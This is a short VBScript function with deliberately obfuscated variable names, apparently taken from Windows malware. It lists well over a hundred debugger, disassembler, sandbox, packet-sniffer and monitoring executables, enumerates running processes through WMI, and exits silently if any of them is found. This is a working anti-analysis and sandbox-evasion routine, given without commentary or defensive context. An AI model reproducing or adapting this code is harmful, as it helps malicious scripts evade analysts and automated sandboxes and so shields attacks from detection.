Function SearchProcesses()
  FtfIrLKSv=Array("cis.exe","cmdvirth.exe","alive.exe","filewatcherservice.exe","ngvmsvc.exe","sandboxierpcss.exe","analyzer.exe", \
                  "fortitracer.exe","nsverctl.exe","sbiectrl.exe","angar2.exe","goatcasper.exe","ollydbg.exe","sbiesvc.exe", \
                  "apimonitor.exe", "GoatClientApp.exe","peid.exe","scanhost.exe","apispy.exe","hiew32.exe","perl.exe","scktool.exe", \
                  "apispy32.exe","hookanaapp.exe","petools.exe","sdclt.exe","asura.exe","hookexplorer.exe","pexplorer.exe", \
                  "sftdcc.exe","autorepgui.exe","httplog.exe","ping.exe","shutdownmon.exe","autoruns.exe","icesword.exe","pr0c3xp.exe", \
                  "sniffhit.exe","autorunsc.exe","iclicker-release.exe",".exe","prince.exe","snoop.exe","autoscreenshotter.exe","idag.exe", \
                  "procanalyzer.exe", "spkrmon.exe","avctestsuite.exe","idag64.exe","processhacker.exe","sysanalyzer.exe","avz.exe", \
                  "idaq.exe","processmemdump.exe","syser.exe","behaviordumper.exe","immunitydebugger.exe","procexp.exe","systemexplorer.exe", \
                  "bindiff.exe","importrec.exe","procexp64.exe","systemexplorerservice.exe","BTPTrayIcon.exe","imul.exe","procmon.exe", \
                  "sython.exe", "capturebat.exe","Infoclient.exe","procmon64.exe","taskmgr.exe","cdb.exe","installrite.exe","python.exe", \
                  "taslogin.exe","cffexplorer.exe","ipfs.exe","pythonw.exe","tcpdump.exe","clicksharelauncher.exe","iprosetmonitor.exe","qq.exe", \
                  "tcpview.exe","closepopup.exe","iragent.exe","qqffo.exe","timeout.exe","commview.exe","iris.exe","qqprotect.exe", \
                  "totalcmd.exe","cports.exe","joeboxcontrol.exe","qqsg.exe","trojdie.kvpcrossfire.exe","joeboxserver.exe", \
                  "raptorclient.exe","txplatform.exe","dnf.exe"," lamer.exe","regmon.exe","virus.exe","dsniff.exe","LogHTTP.exe","regshot.exe", \
                  "vx.exe","dumpcap.exe", "lordpe.exe","RepMgr64.exe","winalysis.exe","emul.exe","malmon.exe","RepUtils32.exe","winapioverride32.exe", \
                  "ethereal.exe","mbarun.exe","RepUx.exe","windbg.exe","ettercap.exe","mdpmon.exe","runsample.exe","windump.exe", \
                  "fakehttpserver.exe","mmr.exe","samp1e.exe","winspy.exe","fakeserver.exe","mmr.exe","sample.exe","wireshark.exe", \
                  "Fiddler.exe","multipot.exe","sandboxiecrypto.exe","XXX.exe","filemon.exe","netsniffer.exe","sandboxiedcomlaunch.exe")
  Set VRfvQEHCs=GetObject("winmgmts:\\.\root\cimv2")
  Set uxSpQuH=VRfvQEHCs.ExecQuery("Select * from Win32_Process")
  For Each XqDiZDh In uxSpQuH
    For Each CMUDEKiI In FtfIrLKSv
      If XqDiZDh.Name=CMUDEKiI Then
        wscript.Quit
      End If
    Next
  Next
End Function
